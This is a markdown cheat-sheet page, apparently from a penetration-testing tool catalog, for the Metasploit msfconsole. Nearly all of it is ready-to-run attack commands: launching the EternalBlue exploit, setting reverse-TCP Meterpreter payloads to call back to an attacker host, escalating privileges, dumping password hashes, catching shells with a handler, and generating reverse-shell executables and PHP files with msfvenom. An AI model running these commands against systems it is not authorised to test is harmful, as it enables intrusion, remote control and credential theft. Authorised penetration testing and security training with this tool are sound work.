---
name: msfconsole
category: Exploitation
description: Metasploit Framework console to select, configure and run exploits.
tags: [metasploit, exploit, payload, meterpreter, msfvenom]
---

# msfconsole

**msfconsole** is the main interface to the **Metasploit Framework** — search, configure and launch exploits, auxiliary scanners and post modules, then manage sessions and payloads.

> `apt install metasploit-framework` · start DB first: `msfdb init` · [docs.metasploit.com](https://docs.metasploit.com)

## Launch & search

```bash
msfconsole -q                     # quiet start
```
```text
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021-34527
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > info
```

## Configure & run a module

```text
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 10.0.0.5
msf6 exploit(...) > set LHOST 10.0.0.99
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check                 # verify vulnerable (when supported)
msf6 exploit(...) > exploit               # or: run
msf6 exploit(...) > exploit -j            # run in background (job)
```

## Sessions & Meterpreter

```text
msf6 > sessions -l                 # list sessions
msf6 > sessions -i 1               # interact
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem            # attempt privilege escalation
meterpreter > hashdump
meterpreter > shell                # drop to OS shell
meterpreter > background
```

## Handlers (catch a shell)

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.99; set LPORT 4444
msf6 > run -j
```

## Generating payloads (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f exe -o s.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f elf -o s.elf
msfvenom -p php/reverse_php LHOST=10.0.0.99 LPORT=4444 -f raw -o s.php
msfvenom --list payloads | grep windows
```

## Post-exploitation modules

```text
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > run
```

> Run `msfdb init` for search speed and session tracking. `check` before `exploit` when available. Pair with [searchsploit](#/tool/searchsploit) to find exploits and [msfvenom] payloads caught by `multi/handler`.
